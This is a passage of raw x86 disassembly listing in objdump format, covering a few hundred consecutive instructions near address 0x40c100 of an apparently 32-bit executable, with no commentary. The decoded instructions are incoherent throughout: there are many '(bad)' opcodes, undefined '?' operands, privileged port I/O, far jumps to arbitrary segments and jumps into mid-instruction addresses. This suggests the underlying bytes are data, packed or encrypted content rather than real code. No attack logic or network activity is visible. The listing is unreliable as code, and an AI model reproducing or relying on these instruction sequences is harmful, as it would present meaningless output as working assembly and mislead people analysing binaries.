  40c0fa:	add    cl,BYTE PTR [ebx-0x67]
  40c0fd:	int    0xba
  40c0ff:	ja     0x40c0bf
  40c101:	pushf  
  40c102:	add    al,dl
  40c104:	mov    ebx,esi
  40c106:	outs   dx,BYTE PTR ds:[esi]
  40c107:	loope  0x40c124
  40c109:	sbb    al,0xe4
  40c10b:	pop    es
  40c10c:	push   eax
  40c10d:	sub    al,0x4b
  40c10f:	cld    
  40c110:	ss mov eax,0x526b7086
  40c116:	in     eax,dx
  40c117:	jnp    0x40c0b7
  40c119:	out    0xbe,eax
  40c11b:	cmp    al,0x7a
  40c11d:	aad    0xa
  40c11f:	in     eax,0x50
  40c121:	in     al,dx
  40c122:	and    al,BYTE PTR [edx-0x7ab76e7e]
  40c128:	push   0x2777fa57
  40c12d:	jns    0x40c0df
  40c12f:	leave  
  40c130:	nop
  40c131:	mov    bx,0xdc9f
  40c135:	div    DWORD PTR [edi+0x42]
  40c138:	lods   al,BYTE PTR ds:[esi]
  40c139:	pop    esp
  40c13a:	push   cs
  40c13b:	stc    
  40c13c:	test   eax,0xbeac6bce
  40c141:	jg     0x40c13f
  40c143:	into   
  40c144:	aaa    
  40c145:	xor    esi,esi
  40c147:	test   BYTE PTR [ecx],al
  40c149:	add    eax,DWORD PTR [edi+0x40]
  40c14c:	pop    es
  40c14d:	les    ebx,FWORD PTR [esi]
  40c14f:	mov    ch,0x42
  40c151:	into   
  40c152:	ins    DWORD PTR es:[edi],dx
  40c153:	mov    eax,0xce35ac44
  40c158:	ret    
  40c159:	xchg   esi,eax
  40c15a:	jne    0x40c1c9
  40c15c:	dec    ebp
  40c15d:	xchg   ebx,eax
  40c15e:	scas   eax,DWORD PTR es:[edi]
  40c15f:	test   eax,0xf7da9fd5
  40c164:	add    al,0x46
  40c166:	push   edx
  40c167:	sub    DWORD PTR [ebx-0x1f],ebx
  40c16a:	ins    DWORD PTR es:[edi],dx
  40c16b:	mov    esp,0x82827dc3
  40c170:	mov    ds:0x614b8fcc,eax
  40c175:	in     al,0xe2
  40c177:	repz (bad) 
  40c179:	jbe    0x40c1da
  40c17b:	mov    ?,WORD PTR [edx]
  40c17d:	stos   DWORD PTR es:[edi],eax
  40c17e:	mov    edx,?
  40c180:	outs   dx,BYTE PTR ds:[esi]
  40c181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c182:	push   esp
  40c183:	pop    esp
  40c184:	add    esi,0xdbe4f95
  40c18a:	or     al,0xf3
  40c18c:	(bad)  
  40c18d:	mov    al,0x9
  40c18f:	call   0xb8473336
  40c194:	sar    DWORD PTR [ebp-0x72f27c6a],0xc7
  40c19b:	xchg   ebx,eax
  40c19c:	adc    al,0x5
  40c19e:	in     al,0xaa
  40c1a0:	loope  0x40c197
  40c1a2:	mov    al,ds:0x76a95853
  40c1a7:	xor    edi,ebx
  40c1a9:	int    0xf8
  40c1ab:	jo     0x40c16e
  40c1ad:	add    cl,dh
  40c1af:	sahf   
  40c1b0:	gs push ecx
  40c1b2:	xchg   edi,eax
  40c1b3:	rol    BYTE PTR [esi+0x254e6e5f],cl
  40c1b9:	daa    
  40c1ba:	sbb    al,0x51
  40c1bc:	je     0x40c1f0
  40c1be:	sbb    esi,DWORD PTR [ebx]
  40c1c0:	push   eax
  40c1c2:	(bad)  
  40c1c3:	lds    ebx,FWORD PTR [eax+0x7564704d]
  40c1c9:	aad    0xd1
  40c1cb:	aas    
  40c1cc:	or     edi,DWORD PTR [ebx-0x30609c3]
  40c1d2:	mov    edi,0x6cfba7e6
  40c1d7:	xchg   esi,eax
  40c1d8:	pop    es
  40c1d9:	fnsave [ebp+0x14d2bd6e]
  40c1df:	jns    0x40c169
  40c1e1:	adc    edi,DWORD PTR [ebx-0x5a6ff0a0]
  40c1e7:	daa    
  40c1e8:	adc    dh,BYTE PTR [edi+0x16]
  40c1eb:	rcl    BYTE PTR [ecx],cl
  40c1ed:	retf   0xbaeb
  40c1f0:	add    edi,0x68
  40c1f3:	jnp    0x40c259
  40c1f5:	pop    ds
  40c1f6:	and    al,0x17
  40c1f8:	pop    edi
  40c1f9:	jl     0x40c1c0
  40c1fb:	ja     0x40c21f
  40c1fd:	fistp  DWORD PTR [edx]
  40c1ff:	icebp  
  40c200:	stc    
  40c201:	fadd   QWORD PTR [edi-0x5b1455de]
  40c207:	xchg   edi,eax
  40c208:	mov    edx,ds
  40c20a:	or     DWORD PTR [eax+0x27],edi
  40c20d:	fsubp  st(1),st
  40c20f:	sub    DWORD PTR [ebp-0x5b316b65],esi
  40c215:	fidivr WORD PTR [esi]
  40c217:	mov    bl,0xd3
  40c219:	inc    eax
  40c21a:	or     BYTE PTR [edi-0x1a],ah
  40c21d:	add    cl,BYTE PTR [ebx]
  40c21f:	(bad)  
  40c220:	jl     0x40c218
  40c222:	pop    edi
  40c223:	imul   esp,ebp,0x79507ebb
  40c229:	or     ebp,0x5d0c862d
  40c22f:	in     eax,dx
  40c230:	mov    esi,0x3f2c856f
  40c235:	ret    
  40c236:	xchg   ebp,eax
  40c237:	pop    edx
  40c238:	int    0x3
  40c23a:	pop    ss
  40c23b:	cmp    bh,BYTE PTR ds:0xd5c12d30
  40c241:	in     eax,dx
  40c242:	scas   eax,DWORD PTR es:[edi]
  40c243:	leave  
  40c244:	jb     0x40c216
  40c246:	push   ecx
  40c247:	mov    ds:0x52547f27,al
  40c24c:	enter  0xd8c0,0xba
  40c250:	dec    eax
  40c251:	jo     0x40c20d
  40c253:	scas   al,BYTE PTR es:[edi]
  40c254:	sub    eax,0x480884e4
  40c259:	inc    ebx
  40c25a:	inc    edx
  40c25b:	nop
  40c25c:	and    esi,DWORD PTR [edi+ebp*2+0x6f]
  40c260:	icebp  
  40c261:	push   0x7e
  40c263:	mov    al,ds:0x2b8a9986
  40c268:	mov    bh,dl
  40c26a:	bound  edx,QWORD PTR [ebx+0x53]
  40c26d:	pop    es
  40c26e:	pop    ebp
  40c26f:	cmp    BYTE PTR cs:[edi],dl
  40c272:	imul   esp,DWORD PTR [ebx+0x7e29e864],0xda4baaac
  40c27c:	sub    eax,0x2b95e6c6
  40c281:	and    al,BYTE PTR [ebp+0x5]
  40c284:	and    al,0x25
  40c286:	push   ebx
  40c287:	call   0x192e:0xe35722fe
  40c28e:	out    0x45,al
  40c290:	test   bl,dh
  40c292:	test   BYTE PTR [ebx+0x13],bl
  40c295:	add    DWORD PTR [ecx+0x57aeeaf3],esi
  40c29b:	mov    ebp,0xc9fd39e9
  40c2a0:	loopne 0x40c2ab
  40c2a2:	push   cs
  40c2a3:	xor    BYTE PTR [ebx+0x3c],dh
  40c2a6:	fs push ecx
  40c2a8:	sub    eax,0xfac7c713
  40c2ad:	inc    eax
  40c2ae:	pop    es
  40c2af:	sahf   
  40c2b0:	add    BYTE PTR [eax+0x73c5cb34],ch
  40c2b6:	ret    0x7e1
  40c2b9:	aaa    
  40c2ba:	dec    esi
  40c2bb:	pop    esp
  40c2bc:	repz ficomp WORD PTR [esi*1+0x2e7cbdba]
  40c2c4:	inc    esi
  40c2c5:	cli    
  40c2c6:	xchg   edx,eax
  40c2c7:	dec    edx
  40c2c8:	push   ds
  40c2c9:	cmp    BYTE PTR [ecx],0xa6
  40c2cc:	or     al,0x96
  40c2ce:	sti    
  40c2cf:	mov    ecx,0x6516be26
  40c2d4:	sub    cl,cl
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	mov    ds:0x7fa0c310,eax
  40c2dc:	ja     0x40c28a
  40c2de:	arpl   WORD PTR [eax+0x6dbad985],cx
  40c2e4:	add    eax,0xb1a56dac
  40c2e9:	lods   al,BYTE PTR ds:[esi]
  40c2ea:	(bad)  
  40c2eb:	sbb    edi,ebx
  40c2ed:	pop    eax
  40c2ee:	jmp    0xebbced9
  40c2f3:	fimul  WORD PTR [esi]
  40c2f5:	pop    ds
  40c2f6:	pop    ds
  40c2f7:	retf   0xc788
  40c2fa:	or     edx,DWORD PTR [ebx]
  40c2fc:	pop    ebp
  40c2fd:	sti    
  40c2fe:	lods   al,BYTE PTR ds:[esi]
  40c2ff:	imul   esi,DWORD PTR [edx],0xffffffaf
  40c302:	test   DWORD PTR [edi+0x2b],0x5436f879
  40c309:	mov    bh,0x61
  40c30b:	out    0x50,al
  40c30d:	aad    0x57
  40c30f:	loope  0x40c325
  40c311:	sbb    BYTE PTR [edi+0x77b82bf7],cl
  40c317:	pop    esi
  40c318:	retf   
  40c319:	scas   al,BYTE PTR es:[edi]
  40c31a:	pop    ecx
  40c31b:	hlt    
  40c31c:	es pop edi
  40c31e:	sbb    BYTE PTR [esi+edx*2-0x7e],dh
  40c322:	sti    
  40c323:	out    0x97,eax
  40c325:	ins    DWORD PTR es:[edi],dx
  40c326:	cwde   
  40c327:	mov    ds:0x49c353c2,al
  40c32c:	add    bh,bl
  40c32e:	ds std 
  40c330:	jno    0x40c2eb
  40c332:	and    al,0x86
  40c334:	mov    bl,ah
  40c336:	push   ss
  40c337:	pop    ebp
  40c338:	jo     0x40c2ed
  40c33a:	adc    al,0x81
  40c33c:	or     BYTE PTR [eax+0xa4f002d],0x45
  40c343:	lds    edi,FWORD PTR [bx+si-0x508d]
  40c348:	add    DWORD PTR [ecx],0x79bc42a5
  40c34e:	and    cl,al
  40c350:	clc    
  40c351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c352:	fcmove st,st(5)
  40c354:	pop    edi
  40c355:	cmp    cl,0x27
  40c358:	mov    eax,DWORD PTR [esi+0x61]
  40c35b:	jo     0x40c312
  40c35d:	jno    0x40c33f
  40c35f:	sub    DWORD PTR [eax-0x21],esi
  40c362:	push   ss
  40c363:	test   eax,0x97767e58
  40c368:	inc    ebp
  40c369:	outs   dx,BYTE PTR ds:[esi]
  40c36a:	test   al,0xb
  40c36c:	mov    ebx,0x5ca02641
  40c371:	or     DWORD PTR [esi],edi
  40c373:	xchg   ecx,eax
  40c374:	aas    
  40c375:	xor    edx,DWORD PTR [edi]
  40c377:	jmp    0x8ee7:0x7902cde7
  40c37e:	mov    edx,ebx
  40c380:	int3   
  40c381:	mov    ds:0x56c8a533,al
  40c386:	add    al,0x86
  40c388:	ss mov ch,0x33
  40c38b:	hlt    
  40c38c:	repnz idiv BYTE PTR [ebx+0x2b51ea32]
  40c393:	or     DWORD PTR [eax+ebp*1+0x77],eax
  40c397:	cmp    al,0xd1
  40c399:	popa   
  40c39a:	sbb    DWORD PTR fs:[esi-0x4b],esi
  40c39e:	cmp    al,0x88
  40c3a0:	jmp    0xfb82:0xc0c57f2
  40c3a7:	xchg   esp,eax
  40c3a8:	jge    0x40c39a
  40c3aa:	adc    eax,0x583fb07d
  40c3af:	ror    ebx,0x2
  40c3b2:	in     al,0xc3
  40c3b4:	adc    DWORD PTR [eax-0x1d],edi
  40c3b7:	jg     0x40c40d
  40c3b9:	stos   BYTE PTR es:[edi],al
  40c3ba:	out    0x31,eax
  40c3bc:	stos   BYTE PTR es:[edi],al
  40c3bd:	pop    ecx
  40c3be:	shufps xmm4,XMMWORD PTR [edx],0xe5
  40c3c2:	cld    
  40c3c3:	les    ecx,FWORD PTR [esi-0x421669cf]
  40c3c9:	mov    ch,0xa6
  40c3cb:	pop    ecx
  40c3cc:	add    eax,0x53d5976c
  40c3d1:	lahf   
  40c3d2:	fild   WORD PTR [eax]
  40c3d4:	jbe    0x40c396
  40c3d6:	push   cs
  40c3d7:	dec    eax
  40c3d8:	aam    0x5c
  40c3da:	fcomi  st,st(5)
  40c3dc:	add    ah,BYTE PTR [eax+0x5a0e6132]
  40c3e2:	adc    ebx,DWORD PTR [ebx]
  40c3e4:	cdq    
  40c3e5:	pop    ebx
  40c3e6:	ins    BYTE PTR es:[edi],dx
  40c3e7:	popa   
  40c3e8:	push   edi
  40c3e9:	rcr    dh,cl
  40c3eb:	popa   
  40c3ec:	xlat   BYTE PTR ds:[ebx]
  40c3ed:	icebp  
  40c3ee:	std    
  40c3ef:	repnz fistp QWORD PTR [esi-0x59d5ed36]
  40c3f6:	test   dh,bl
  40c3f8:	cmp    DWORD PTR [esi],esp
  40c3fa:	jnp    0x40c3d6
  40c3fc:	shl    esi,cl
  40c3fe:	cmc    
  40c3ff:	jno    0x40c478
  40c401:	shr    ecx,1
  40c403:	pop    esp
  40c404:	push   ecx
  40c405:	sbb    bh,BYTE PTR [edi]
  40c407:	sbb    esi,DWORD PTR [bx+si]
  40c40a:	xor    al,0x31
  40c40c:	sub    dl,al
  40c40e:	jmp    0xd8:0xe8927370
  40c415:	jle    0x40c418
  40c417:	push   eax
  40c418:	jp     0x40c3f1
  40c41a:	add    DWORD PTR [ebx-0x3c],ebx
  40c41d:	and    al,0x5d
  40c41f:	loopne 0x40c434
  40c421:	lds    ebx,FWORD PTR [ebx+0x3d]
  40c424:	imul   BYTE PTR [ebp+0x58562677]
  40c42a:	sbb    al,0xef
  40c42c:	lea    ebp,[edx-0x3]
  40c42f:	push   cs
  40c430:	inc    ecx
  40c431:	mov    BYTE PTR [esi],dl
  40c433:	call   0x8882:0x80f9b492
  40c43a:	(bad)  
  40c43b:	lods   eax,DWORD PTR ds:[esi]
  40c43c:	(bad)  
  40c43d:	jle    0x40c4b6
  40c43f:	xchg   ebx,esi
  40c441:	cmp    al,0xf1
  40c443:	cmp    DWORD PTR [ebp-0x60],ecx
  40c446:	xor    BYTE PTR [eiz*2-0x39d295a],dl
  40c44d:	pusha  
  40c44e:	adc    al,0xa1
  40c450:	mov    DWORD PTR [edx],esi
  40c452:	xchg   edi,eax
  40c453:	push   eax
  40c454:	arpl   dx,si
  40c456:	lods   al,BYTE PTR ds:[esi]
  40c457:	add    eax,0x457980a3
  40c45c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c45e:	inc    esp
  40c45f:	ds jns 0x40c45e
  40c462:	data16 (bad) 
  40c464:	shr    BYTE PTR [edi],cl
  40c466:	push   esi
  40c467:	mov    bh,0x6d
  40c469:	jge    0x40c3fa
  40c46b:	cwde   
  40c46c:	js     0x40c466
  40c46e:	jmp    0x40c46e
  40c470:	dec    ecx
  40c471:	xor    eax,0x58f76d82
  40c476:	adc    DWORD PTR [esi-0x298c2f7f],edi
  40c47c:	jmp    0x40c46e
  40c47e:	and    al,0x63
  40c480:	mov    al,0x64
  40c482:	xchg   DWORD PTR [edi+esi*8+0x39],ebp
  40c486:	pop    esi
  40c487:	mov    bl,0xe4
  40c48a:	inc    ebp
  40c48b:	(bad)  
  40c48d:	loopne 0x40c4d2
  40c48f:	loope  0x40c4dd
  40c491:	mov    ?,ebx
  40c493:	xchg   esi,eax
  40c494:	rcl    DWORD PTR [edi],1
  40c496:	xchg   esi,eax
  40c497:	in     al,0xbf
  40c499:	mov    dh,0x2c
  40c49b:	sar    BYTE PTR [ecx+eiz*2-0x76],cl
  40c49f:	xor    al,BYTE PTR [eax-0x2455b0af]
  40c4a5:	pop    ds
  40c4a6:	loopne 0x40c455
  40c4a8:	aad    0xea
  40c4aa:	lds    ebp,FWORD PTR [ebp-0x14c24b8d]
  40c4b0:	lods   eax,DWORD PTR ds:[esi]
  40c4b1:	lock xlat BYTE PTR fs:[ebx]
  40c4b4:	mov    esi,0xfc6b6955
  40c4b9:	dec    ecx
  40c4ba:	fstp   QWORD PTR [esi+0x1f3f5729]
  40c4c0:	add    ah,BYTE PTR [eax-0x23]
  40c4c3:	xor    al,0x8a
  40c4c5:	ficom  WORD PTR [edi-0x23]
  40c4c8:	pop    ecx
  40c4c9:	das    
  40c4ca:	stos   BYTE PTR es:[edi],al
  40c4cb:	imul   edx,DWORD PTR [eax+0x67],0x6eb042ad
  40c4d2:	sub    BYTE PTR [eax-0x27],dh
  40c4d5:	bound  esp,QWORD PTR [ebx]
  40c4d7:	ror    bl,0x97
  40c4da:	push   esp
  40c4db:	pusha  
  40c4dc:	mov    ebx,0x72d36dcc
  40c4e2:	dec    esi
  40c4e3:	aam    0x54
  40c4e5:	test   BYTE PTR [esi+0x37],dl
  40c4e8:	xchg   esp,eax
  40c4e9:	mov    ebp,0x2a149ba3
  40c4ee:	inc    esi
  40c4ef:	push   eax
  40c4f0:	or     BYTE PTR [edi-0x2953c368],0x85
  40c4f7:	mov    ch,0xf2
  40c4f9:	cli    
  40c4fa:	fstp   DWORD PTR [esi+0x79]
  40c4fd:	sub    DWORD PTR [edi+edx*1],0x3d3d5c62
  40c504:	and    BYTE PTR [eax+edx*4-0x16],cl
  40c508:	inc    ebp
  40c509:	mov    es,WORD PTR [ecx-0x52]
  40c50c:	sahf   
  40c50d:	xor    al,dh
  40c50f:	cdq    
  40c510:	sti    
  40c511:	inc    eax
  40c512:	xor    al,0x9f
  40c514:	sbb    eax,0xd030b784
  40c519:	or     eax,0x3d87622f
  40c51e:	adc    DWORD PTR [ecx-0x4b],edx
  40c521:	adc    dh,cl
  40c523:	push   es
  40c524:	push   eax
  40c525:	push   0x73
  40c527:	xchg   esp,eax
  40c528:	and    cl,BYTE PTR [edi-0x333223ed]
  40c52e:	ss ret 
  40c530:	test   cl,bh
  40c532:	adc    eax,0x855fa097
  40c537:	into   
  40c538:	ins    BYTE PTR es:[edi],dx
  40c539:	dec    esi
  40c53a:	shl    DWORD PTR [ecx-0x59],1
  40c53d:	pop    ds
  40c53e:	push   0xffffffe0
  40c540:	jle    0x40c539
  40c542:	cmp    BYTE PTR [esi-0x15],dh
  40c545:	stos   BYTE PTR es:[edi],al
  40c546:	xchg   BYTE PTR [ebx+edi*2],dl
  40c549:	(bad)  
  40c54a:	fs pop esi
  40c54c:	stc    
  40c54d:	mov    al,ds:0x8d3ba752
  40c552:	push   ecx
  40c553:	add    al,0xe7
  40c555:	cmp    BYTE PTR [ebx-0x66496f33],0x3b
  40c55c:	xlat   BYTE PTR ds:[ebx]
  40c55d:	mov    bl,0xe2
  40c55f:	xlat   BYTE PTR ds:[ebx]
  40c560:	xstore-rng (bad)
  40c561:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c562:	test   BYTE PTR [ecx-0x5a],al
  40c565:	pop    ss
  40c566:	add    BYTE PTR [ebx-0x2b],bh
  40c569:	push   eax
  40c56a:	call   0xca22:0x12595460
  40c571:	popf   
  40c572:	jp     0x40c5c3
  40c574:	(bad)  [esp+ebx*4+0x17ecaad6]
  40c57b:	scas   al,BYTE PTR es:[edi]
  40c57c:	mov    esi,0xd5751f72
  40c581:	mov    ah,0x5a
  40c583:	pop    eax
  40c584:	and    DWORD PTR [ebp-0x65],ecx
  40c587:	xchg   ebp,eax
  40c588:	sub    ah,BYTE PTR [edi+0x73042f3a]
  40c58e:	mov    esi,0xf4d35d2e
  40c593:	call   0xf8517c7a
  40c598:	add    al,bl
  40c59a:	retf   0xe9f9
  40c59d:	scas   eax,DWORD PTR es:[edi]
  40c59e:	pop    edx
  40c59f:	mov    edi,0x212cb5ba
  40c5a4:	inc    esp
  40c5a5:	fldcw  WORD PTR [ecx+ebx*8+0x14]
  40c5a9:	(bad)  
  40c5aa:	out    dx,al
  40c5ab:	in     al,dx
  40c5ac:	daa    
  40c5ad:	xchg   esp,eax
  40c5ae:	mov    bh,0x24
  40c5b0:	sbb    ah,BYTE PTR [ebx+ebx*8-0x1a]
  40c5b4:	outs   dx,BYTE PTR ds:[esi]
  40c5b5:	mov    bl,0x7c
  40c5b7:	or     BYTE PTR [esi-0x47beb8f8],dl
  40c5bd:	(bad)  
  40c5be:	ds (bad) 
  40c5c0:	mov    ds:0x9e6375f7,eax
  40c5c5:	jns    0x40c61d
  40c5c7:	shl    ebp,1
  40c5c9:	xor    bh,BYTE PTR [eax]
  40c5cb:	jns    0x40c5a0
  40c5cd:	and    BYTE PTR [esi],dh
  40c5cf:	pop    edi
  40c5d0:	in     al,0x86
  40c5d2:	mov    esi,DWORD PTR [ebx]
  40c5d4:	xor    al,BYTE PTR [esp+ebx*8+0x5]
  40c5d8:	push   DWORD PTR [edx]
  40c5da:	aam    0xaf
  40c5dc:	push   ss
  40c5dd:	or     BYTE PTR [esi-0x66f1e06],ah
  40c5e3:	ret    
  40c5e4:	push   0x939b72e8
  40c5e9:	xchg   ebp,eax
  40c5ea:	mov    cl,0x78
  40c5ec:	xchg   esp,eax
  40c5ed:	or     WORD PTR [eax],0x63
  40c5f1:	loopne 0x40c5ec
  40c5f3:	dec    edi
  40c5f4:	iret   
  40c5f5:	iret   
  40c5f6:	mov    BYTE PTR [ebx],dl
  40c5f8:	add    eax,0xc635ebb7
  40c5fd:	cmp    BYTE PTR [ecx+ebp*8],dl
  40c600:	int3   
  40c601:	outs   dx,DWORD PTR ds:[esi]
  40c602:	xchg   edx,eax
  40c603:	xor    DWORD PTR [ebx-0x255368cb],esi
  40c609:	fstp   DWORD PTR [edi+0x1c]
  40c60c:	mov    eax,ds:0x6613c286
  40c611:	adc    al,0x22
  40c613:	call   0xa229d21
  40c618:	dec    ebx
  40c619:	push   DWORD PTR [edx]
  40c61b:	scas   al,BYTE PTR es:[edi]
  40c61c:	inc    esp
  40c61d:	mov    esi,0x31e1311
  40c622:	xor    bl,BYTE PTR [ebx]
  40c624:	iret   
  40c625:	xchg   ebx,eax
  40c626:	xchg   DWORD PTR [eax-0x42],edi
  40c629:	call   0xb1cc3890
  40c62e:	jno    0x40c5f1
  40c630:	sbb    al,0xa5
  40c632:	or     al,0x45
  40c634:	hlt    
  40c635:	jne    0x40c5f3
  40c637:	push   ecx
  40c638:	add    al,0x7a
  40c63a:	scas   eax,DWORD PTR es:[edi]
  40c63b:	scas   al,BYTE PTR es:[edi]
  40c63c:	stc    
  40c63d:	fcom   DWORD PTR [eax-0x4a]
  40c640:	pop    esp
  40c641:	into   
  40c642:	scas   al,BYTE PTR es:[edi]
  40c643:	pop    edi
  40c644:	imul   esi,DWORD PTR [eax+0x54],0xffffffea
  40c648:	out    dx,eax
  40c649:	or     dl,cl
  40c64b:	xlat   BYTE PTR ds:[ebx]
  40c64c:	push   0xa186037
  40c651:	out    0x7d,al
  40c653:	and    BYTE PTR [eax],0xd4
  40c656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c657:	mov    ah,0x83
  40c659:	int3   
  40c65a:	ja     0x40c626
  40c65c:	adc    al,0xf0
  40c65e:	add    esi,DWORD PTR [esi-0x2d]
  40c661:	clc    
  40c662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c663:	inc    BYTE PTR [edx+0x6f0f781e]
  40c669:	clc    
  40c66a:	jmp    0xf5637785
  40c66f:	cwd    
  40c671:	or     cl,dl
  40c673:	int    0x74
  40c675:	push   es
  40c676:	call   0x7cd895ce
  40c67b:	inc    ebx
  40c67c:	mov    ah,0x95
  40c67e:	nop
  40c67f:	mov    edx,0x14394b28
  40c684:	mov    bh,0x30
  40c686:	sbb    DWORD PTR [eax+0x15],ebx
  40c689:	cs pop ss
  40c68b:	sbb    DWORD PTR cs:[edx+0x46],esi
  40c68f:	jp     0x40c693
  40c691:	das    
  40c692:	xor    BYTE PTR [esi-0x379d6761],cl
  40c698:	dec    eax
  40c699:	(bad)  
  40c69a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c69b:	inc    edx
  40c69c:	loop   0x40c659
  40c69e:	clc    
  40c69f:	cs aam 0xcf
  40c6a2:	ja     0x40c6c7
  40c6a4:	dec    edx
  40c6a5:	mov    esp,0xcc71a1ce
  40c6aa:	cwde   
  40c6ab:	jecxz  0x40c68b
  40c6ad:	mov    al,ds:0x654718d3
  40c6b2:	and    bh,bh
  40c6b4:	stc    
  40c6b5:	addr16 pop esi
  40c6b7:	adc    DWORD PTR [esi-0x63],ebx
  40c6ba:	and    al,0x54
  40c6bc:	nop
  40c6bd:	int    0xc2
  40c6bf:	mov    ebp,0x13f4ee48
  40c6c4:	test   eax,0x8525ef81
  40c6c9:	mov    al,ds:0xf4af19b7
  40c6ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6cf:	mov    BYTE PTR [edx+0x18],cl
  40c6d2:	lahf   
  40c6d3:	out    dx,eax
  40c6d4:	jmp    0xcf51:0xc2b6dba6
  40c6db:	pop    edx
  40c6dc:	add    DWORD PTR [eax],ebx
  40c6de:	sbb    edi,edx
  40c6e0:	(bad)  
  40c6e1:	ficom  WORD PTR [edi]
  40c6e3:	xor    edi,0x70
  40c6e6:	jnp    0x40c6e6
  40c6e8:	sbb    cl,BYTE PTR [eax]
  40c6ea:	pop    eax
  40c6eb:	out    0x21,al
  40c6ed:	aad    0x37
  40c6ef:	std    
  40c6f0:	xchg   esp,eax
  40c6f1:	mov    bl,0x3d
  40c6f3:	sti    
  40c6f4:	jmp    0x30dc142b
  40c6f9:	jae    0x40c766
  40c6fb:	outs   dx,DWORD PTR ds:[esi]
  40c6fc:	mov    edi,0xa70dd5cf
  40c701:	push   0x253f4d9d
  40c706:	(bad)  
  40c707:	and    dl,bh
  40c709:	outs   dx,DWORD PTR ds:[esi]
  40c70a:	cmp    eax,0x80f57b26
  40c70f:	(bad)  
  40c710:	jle    0x40c6bd
  40c712:	inc    ebp
  40c713:	es cli 
  40c715:	lds    esi,FWORD PTR [edi+0x52]
  40c718:	inc    eax
  40c719:	add    BYTE PTR [edi],ch
  40c71b:	jns    0x40c6a9
  40c71d:	(bad)  
  40c71e:	lods   al,BYTE PTR ds:[esi]
  40c71f:	sbb    eax,DWORD PTR [edx]
  40c721:	mov    ebx,0xfd5d55ad
  40c726:	add    BYTE PTR [ecx-0x5e],dl
  40c729:	xchg   esp,eax
  40c72a:	pop    esp
  40c72b:	mul    DWORD PTR [ebx+eiz*4]
  40c72e:	add    edi,DWORD PTR [esi-0x2]
  40c731:	leave  
  40c732:	push   es
  40c733:	sahf   
  40c734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c735:	out    0x2d,eax
  40c737:	adc    DWORD PTR ds:0x42cb4c3f,0xfffffffe
  40c73e:	jne    0x40c6d6
  40c740:	mov    WORD PTR [eax+0x7a],?
  40c743:	call   0x87d5:0xd91a35b1
  40c74a:	loope  0x40c74c
  40c74c:	xor    dl,dl
  40c74e:	jmp    0x40c73f
  40c750:	pop    ebx
  40c751:	fs push ebx
  40c753:	sbb    ecx,DWORD PTR [edi-0x5]
  40c756:	pusha  
  40c757:	and    al,0x42
  40c759:	and    ecx,DWORD PTR [edi]
  40c75b:	sti    
  40c75c:	shl    BYTE PTR [edi-0x17e58ca],1
  40c762:	xlat   BYTE PTR ds:[ebx]
  40c763:	inc    ebp
  40c764:	xchg   esi,eax
  40c765:	sub    BYTE PTR [ebx+0x551727b9],al
  40c76b:	cpuid  
  40c76d:	enter  0xb0cc,0xa7
  40c771:	cmp    DWORD PTR [eax-0x69],ebp
  40c774:	cmp    BYTE PTR [ebx-0x3a],bl
  40c777:	sbb    dl,BYTE PTR [edx]
  40c779:	pop    edx
  40c77a:	mov    edi,0x75936759
  40c77f:	mov    al,ds:0xa77b57d1
  40c784:	dec    edx
  40c785:	ins    DWORD PTR es:[edi],dx
  40c786:	std    
  40c787:	sub    BYTE PTR [esi],cl
  40c789:	pop    eax
  40c78a:	imul   BYTE PTR [edi]
  40c78c:	inc    ebx
  40c78d:	out    0x27,eax
  40c78f:	jns    0x40c74b
  40c791:	xor    dh,0x81
  40c794:	pop    esp
  40c795:	aas    
  40c796:	(bad)  
  40c798:	push   edi
  40c799:	sbb    al,0x6c
  40c79b:	mov    edx,0x6fcaf13d
  40c7a0:	adc    DWORD PTR [ecx],0x149d8e45
  40c7a6:	ins    BYTE PTR es:[edi],dx
  40c7a7:	and    ch,BYTE PTR ds:0x71da5c68
  40c7ad:	out    dx,eax
  40c7ae:	inc    esp
  40c7af:	jb     0x40c81e
  40c7b1:	cmp    ebx,0x5a
  40c7b4:	mov    eax,0x23788640
  40c7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7ba:	mov    edi,0xf0e58fe8
  40c7bf:	xchg   ebx,eax
  40c7c0:	sbb    ecx,edi
  40c7c2:	inc    edx
  40c7c3:	fst    DWORD PTR [eax+0x8]
  40c7c6:	into   
  40c7c7:	sahf   
  40c7c8:	xchg   ecx,eax
  40c7c9:	gs jns 0x40c7eb
  40c7cc:	arpl   WORD PTR cs:[edi-0x3d],bp
  40c7d0:	sub    BYTE PTR [esi],ah
  40c7d2:	or     DWORD PTR [edi],eax
  40c7d4:	xchg   ecx,eax
  40c7d5:	inc    ebx
  40c7d6:	not    DWORD PTR [ecx-0x18]
  40c7d9:	push   esp
  40c7da:	lea    ebp,[ebp-0x5b2e2439]
  40c7e0:	pusha  
  40c7e1:	stc    
  40c7e2:	mov    esi,0xafa16adf
  40c7e7:	pop    esp
  40c7e8:	fs call 0xdb5608b
  40c7ee:	xor    BYTE PTR [edi+0x75],ah
  40c7f1:	or     ah,BYTE PTR [ecx+0x7d]
  40c7f4:	(bad)  
  40c7f5:	pop    edi
  40c7f6:	call   0x1011:0x4281d097
  40c7fd:	fsub   DWORD PTR [esp+eiz*4+0x36113e10]
  40c804:	dec    edi
  40c805:	repz pop ds
  40c807:	dec    edi
  40c808:	lods   al,BYTE PTR ds:[esi]
  40c809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c80a:	mov    ds,WORD PTR [eax+0x26f99c8d]
  40c810:	mov    eax,ds:0x205aad44
  40c815:	or     eax,0x1c6ccbda
  40c81a:	adc    esp,0x3d069ad8
  40c820:	mov    al,0xda
  40c822:	fcomp  st(5)
  40c824:	in     eax,dx
  40c825:	mov    esi,0xfa1112dd
  40c82a:	ret    
  40c82b:	arpl   bp,di
  40c82d:	loop   0x40c8ab
  40c82f:	bound  ebx,QWORD PTR ds:0x4539208e
  40c835:	xchg   ebx,eax
  40c836:	push   esp
  40c837:	in     al,dx
  40c838:	push   0x899b8834
